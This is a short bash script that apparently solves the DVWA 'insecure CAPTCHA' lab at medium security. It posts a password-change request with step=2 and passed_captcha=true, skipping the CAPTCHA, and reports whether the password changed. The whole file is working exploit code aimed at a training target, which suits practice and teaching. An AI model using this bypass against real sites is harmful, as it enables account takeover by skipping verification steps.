#!/usr/bin/env bash
# usage: ./update-pwd.sh <new password> [<session-id>]

HOST=http://dvwa.localtest
NEW_PASSWORD=$1
SESSIONID=$2

if [ -z "$2" ]
  then
    echo "No session id supplied, use cookie file instead."

    RES=`curl -v -L -c cookies.txt -b cookies.txt -X POST "${HOST}/vulnerabilities/captcha/#" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H "Origin: ${HOST}" \
    -H 'DNT: 1' \
    -H 'Connection: keep-alive' \
    -H "Referer: ${HOST}/vulnerabilities/captcha/" \
    -H 'Upgrade-Insecure-Requests: 1' \
    --data-raw "step=2&password_new=${NEW_PASSWORD}&password_conf=${NEW_PASSWORD}&passed_captcha=true&Change=Change"
    `
  else
    RES=`curl -v -L -X POST "${HOST}/vulnerabilities/captcha/#" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H "Origin: ${HOST}" \
    -H 'DNT: 1' \
    -H 'Connection: keep-alive' \
    -H "Referer: ${HOST}/vulnerabilities/captcha/" \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H "Cookie: PHPSESSID=${SESSIONID}; security=medium" \
    --data-raw "step=2&password_new=${NEW_PASSWORD}&password_conf=${NEW_PASSWORD}&passed_captcha=true&Change=Change"
    `
fi


if [[ $RES == *"Password Changed."* ]]; then
  printf "\n PASSWORD CHANGED!✅ \n"
else
  printf "\n PASSWORD CHANGE FAILED❌ \n"
fi
